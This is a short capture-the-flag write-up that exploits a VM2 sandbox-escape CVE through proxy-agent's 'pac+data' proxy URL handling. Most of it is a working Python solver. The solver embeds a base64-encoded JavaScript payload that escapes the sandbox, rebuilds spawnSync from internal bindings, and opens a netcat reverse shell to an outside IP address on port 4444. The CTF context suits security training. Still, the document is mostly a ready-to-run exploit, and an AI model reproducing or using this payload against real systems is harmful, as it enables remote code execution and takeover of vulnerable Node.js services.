# Writeup

This challenge is inspired by this CVE: [https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9).

The idea is to exploit a module that requires VM2 as a dependency, especially for this challenge. I want to exploit `proxy-agent`, which requires VM2 as a dependency. We can inject a specially crafted proxy URL with the protocol "pac+data" and inject our sandbox escape script into the proxy configuration.

Here is my solver for this challenge:

```python
from itsdangerous import base64_encode
import httpx

TARGET = "http://ctf.tcp1p.com:56662/api/fetch"

payload = "pac+data:plain/text;base64,"
payload += base64_encode("""
eval(`
FindProxyForURL=()=>{}
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor(\\`

spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}
function spawnSync(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
let exec = (x)=>spawnSync("sh",['-c',x])
console.log(exec("nc 108.137.37.157 4444 -e sh").stderr.toString())
\\`)(); }
            )
        }
    }
};
p.then();`)
""").decode()

res = httpx.get(TARGET, params={
    "url": "https://google.com",
    "proxyUrl": payload
})
print(res.text)
```
